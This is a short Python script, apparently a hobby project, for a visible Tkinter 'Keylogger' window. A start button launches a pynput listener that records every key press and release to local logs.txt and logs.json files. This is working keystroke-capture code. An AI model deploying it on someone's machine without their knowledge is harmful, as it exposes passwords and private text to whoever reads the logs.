import json
from pynput import keyboard
import tkinter as tk
from tkinter import *
import time

root = tk.Tk()
root.title("Keylogger")
root.geometry("150x200")

lst=[]
key_list=[]
x=False
keystrokes=""

def update_txt_file(key):
    with open('logs.txt','w+') as f:
        f.write(key)
def update_json_file(key_list):
    with open('logs.json', '+wb') as f:
        key_list_bytes = json.dumps(key_list).encode()
        f.write(key_list_bytes)

def on_press(key):
    global x,lst,key_list
    if x== False:
        lst.append([str(time.ctime()),"",])
        key_list.append({'pressed' : f'{key}'})

        x=True
        if x==True:
            key_list.append({'held' : f'{key}'})
    update_json_file(key_list)
    update_txt_file(keystrokes)
def on_release(key):
    global keystrokes,lst,x
    key_list.append({'released': f'{key}'})
    if x==True:
        x = False
    update_json_file(key_list)
    keystrokes+=str(key)
    update_txt_file(str(keystrokes))

def butaction():
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

empty = Label(root,text="   ").grid(row=1,column=0)
empty = Label(root,text="   ").grid(row=2,column=0)
empty = Label(root,text="keylogger").grid(row=3,column=3)
empty = Label(root,text="   ").grid(row=4,column=0)
empty = Label(root,text="   ").grid(row=5,column=0)
button = Button(root,text="start keylogger",command=butaction).grid(row=6, column=3)
root.mainloop()



